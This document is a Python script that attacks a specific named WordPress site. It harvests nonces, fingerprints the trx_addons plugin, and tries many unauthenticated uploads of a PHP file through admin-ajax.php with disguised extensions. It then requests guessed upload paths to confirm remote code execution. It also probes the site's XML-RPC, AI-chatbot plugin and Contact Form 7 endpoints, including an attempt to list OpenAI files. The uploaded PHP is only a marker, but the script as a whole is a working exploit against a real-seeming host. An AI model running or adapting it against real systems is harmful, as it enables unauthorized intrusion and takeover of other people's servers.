#!/usr/bin/env python3
import json, pathlib, re, subprocess, time, uuid

UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
BASE = 'https://kznvip.co.za'
OUT = pathlib.Path('out')
OUT.mkdir(exist_ok=True)
log = []

def sh(cmd, timeout=90):
    return subprocess.run(cmd, capture_output=True, timeout=timeout)

def curl(args, timeout=90):
    cmd = ['curl', '-sS', '-A', UA, '-c', 'out/cookies.txt', '-b', 'out/cookies.txt', *args]
    p = subprocess.run(cmd, capture_output=True, timeout=timeout)
    return p.returncode, p.stdout, p.stderr

def logline(s):
    print(s, flush=True)
    log.append(s)

# connectivity
rc, body, err = curl(['-o', 'out/home.html', '-w', '%{http_code}', '--max-time', '90', f'{BASE}/'])
home_code = body.decode().strip() if body else '000'
logline(f'home:{home_code}')
home = pathlib.Path('out/home.html').read_text(errors='ignore')

nonces = set(re.findall(r'ajax_nonce"\s*:\s*"([a-f0-9]+)"', home))
nonces |= set(re.findall(r'"nonce"\s*:\s*"([a-f0-9]{10})"', home))
nonces |= set(re.findall(r"ajax_nonce['\"]?\s*[:=]\s*['\"]([a-f0-9]+)['\"]", home))
fb = pathlib.Path('payload/nonce.txt')
if fb.exists():
    nonces.add(fb.read_text().strip())
nonces = [n for n in nonces if n]
pathlib.Path('out/nonces.json').write_text(json.dumps(nonces, indent=2))
logline(f'nonces:{nonces}')

versions = sorted(set(re.findall(r'plugins/trx_addons/[^\"\']+\?ver=([0-9.]+)', home)))
pathlib.Path('out/trx_versions.txt').write_text('\n'.join(versions))
themes = sorted(set(re.findall(r'/wp-content/themes/([^/\"\']+)/', home)))
pathlib.Path('out/themes.txt').write_text('\n'.join(themes))
logline(f'trx_ver:{versions} themes:{themes}')

shell = b'<?php echo "LURKSEK_RCE_OK"; ?>'
marker = f'lurksek_{int(time.time())}'
pathlib.Path('out/marker.txt').write_text(marker)

def build(fields, filename, ctype='image/jpeg'):
    boundary = '----WebKitFormBoundary' + uuid.uuid4().hex[:16]
    parts = []
    for k, v in fields.items():
        parts.append(
            f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
        )
    parts.append(
        (
            f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f'Content-Type: {ctype}\r\n\r\n'
        ).encode()
        + shell
        + b'\r\n'
    )
    parts.append(f'--{boundary}--\r\n'.encode())
    return b''.join(parts), f'multipart/form-data; boundary={boundary}'

actions = [
    'trx_addons_uploads_save_data',
    'trx_addons_uploads_save',
    'trx_addons_callback_uploads_save_data',
]
filenames = [f'{marker}.php', f'{marker}.php.jpg', f'{marker}.phtml']
variants = []
for nonce in (nonces or ['missing']):
    for action in actions:
        for fn in filenames:
            fields = {
                'action': action,
                'nonce': nonce,
                '_ajax_nonce': nonce,
                'trx_addons_nonce': nonce,
            }
            body, ctype = build(fields, fn)
            variants.append({'action': action, 'nonce': nonce, 'filename': fn, 'body': body, 'ctype': ctype})
for action in actions[:1]:
    for fn in filenames[:2]:
        body, ctype = build({'action': action}, fn)
        variants.append({'action': action, 'nonce': 'NONE', 'filename': fn, 'body': body, 'ctype': ctype})

hits = []
for i, v in enumerate(variants):
    bin_path = OUT / f'v{i}.bin'
    bin_path.write_bytes(v['body'])
    (OUT / f'v{i}.ctype').write_text(v['ctype'])
    rc, code_b, err = curl([
        '-X', 'POST', f'{BASE}/wp-admin/admin-ajax.php',
        '-H', f'Content-Type: {v["ctype"]}',
        '-H', 'Origin: https://kznvip.co.za',
        '-H', 'Referer: https://kznvip.co.za/',
        '--data-binary', f'@{bin_path}',
        '-D', f'out/v{i}.hdr', '-o', f'out/v{i}.body',
        '-w', '%{http_code}', '--max-time', '60',
    ])
    code = code_b.decode().strip() if code_b else '000'
    body = pathlib.Path(f'out/v{i}.body').read_bytes() if pathlib.Path(f'out/v{i}.body').exists() else b''
    preview = body[:500].decode('utf-8', 'replace')
    line = f"{code} action={v['action']} nonce={v['nonce'][:12]} file={v['filename']} preview={preview!r}"
    logline(line)
    interesting = code in ('200', '201', '400', '403', '500') or any(x in body.lower() for x in [b'lurksek', b'uploads', b'error', b'url', b'success', b'nonce'])
    if interesting:
        urls = re.findall(rb'https?://[^\s\"\'<>]+', body)
        urls += re.findall(rb'/wp-content/uploads/[^\s\"\'<>]+', body)
        hit = {
            'i': i,
            'code': code,
            'action': v['action'],
            'nonce': v['nonce'],
            'filename': v['filename'],
            'preview': preview,
            'urls': [u.decode('utf-8', 'replace') for u in urls[:20]],
        }
        hits.append(hit)
        if b'LURKSEK_RCE_OK' in body or (code == '200' and (b'.php' in body or b'uploads' in body)):
            pathlib.Path('out/upload_hit.json').write_text(json.dumps(hit, indent=2))
            break

pathlib.Path('out/hits.json').write_text(json.dumps(hits, indent=2))
logline(f'HITS:{len(hits)}')

# canary path guesses
from datetime import datetime, timezone
ym = datetime.now(timezone.utc).strftime('%Y/%m')
paths = [
    f'/wp-content/uploads/{ym}/{marker}.php',
    f'/wp-content/uploads/{ym}/lurksek_canary.php',
    f'/wp-content/uploads/trx_addons/{marker}.php',
    f'/wp-content/uploads/{marker}.php',
    f'/wp-content/uploads/lurksek_canary.php',
]
for url in hits:
    for u in url.get('urls', []):
        if u.startswith('http'):
            paths.append(u)
        elif u.startswith('/'):
            paths.append(u)

for p in paths:
    full = p if p.startswith('http') else BASE + p
    rc, code_b, err = curl(['-o', 'out/canary_try.txt', '-w', '%{http_code}', '--max-time', '30', full])
    code = code_b.decode().strip() if code_b else '000'
    body = pathlib.Path('out/canary_try.txt').read_text(errors='ignore') if pathlib.Path('out/canary_try.txt').exists() else ''
    logline(f'canary:{code} {full}')
    if 'LURKSEK_RCE_OK' in body:
        pathlib.Path('out/rce_confirmed.txt').write_text(body)
        logline(f'RCE_CONFIRMED {full}')

# xmlrpc
rc, code_b, err = curl([
    '-X', 'POST', f'{BASE}/xmlrpc.php', '-H', 'Content-Type: text/xml',
    '-d', '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
    '-o', 'out/xmlrpc.xml', '-w', '%{http_code}', '--max-time', '60',
])
logline(f'xmlrpc:{code_b.decode().strip() if code_b else "000"}')
xml = pathlib.Path('out/xmlrpc.xml').read_text(errors='ignore')[:2000]
pathlib.Path('out/xmlrpc_preview.txt').write_text(xml)
logline(xml[:500])

# MWAI
rest = ''
m = re.search(r'wpApiSettings\s*=\s*\{[^}]*nonce["\']?\s*:\s*["\']([a-f0-9]+)["\']', home)
if m:
    rest = m.group(1)
logline(f'rest_nonce:{rest}')
hdrs = ['-H', 'Content-Type: application/json', '-H', 'Origin: https://kznvip.co.za', '-H', 'Referer: https://kznvip.co.za/']
if rest:
    hdrs += ['-H', f'X-WP-Nonce: {rest}']
rc, code_b, err = curl([
    '-X', 'POST', f'{BASE}/wp-json/mwai-ui/v1/chats/submit', *hdrs,
    '-d', '{"botId":"default","newMessage":"ping from security research","sessionId":"lurksek"}',
    '-o', 'out/mwai_chat.json', '-w', '%{http_code}', '--max-time', '90',
])
logline(f'mwai_chat:{code_b.decode().strip() if code_b else "000"}')
logline(pathlib.Path('out/mwai_chat.json').read_text(errors='ignore')[:800] if pathlib.Path('out/mwai_chat.json').exists() else '')

rc, code_b, err = curl([
    f'{BASE}/wp-json/mwai/v1/openai/files/list', *hdrs,
    '-o', 'out/mwai_files.json', '-w', '%{http_code}', '--max-time', '60',
])
logline(f'mwai_files:{code_b.decode().strip() if code_b else "000"}')
logline(pathlib.Path('out/mwai_files.json').read_text(errors='ignore')[:500] if pathlib.Path('out/mwai_files.json').exists() else '')

rc, code_b, err = curl([
    f'{BASE}/wp-json/contact-form-7/v1/contact-forms',
    '-o', 'out/cf7.json', '-w', '%{http_code}', '--max-time', '60',
])
logline(f'cf7:{code_b.decode().strip() if code_b else "000"}')
logline(pathlib.Path('out/cf7.json').read_text(errors='ignore')[:500] if pathlib.Path('out/cf7.json').exists() else '')

pathlib.Path('out/log.txt').write_text('\n'.join(log) + '\n')
print('DONE')
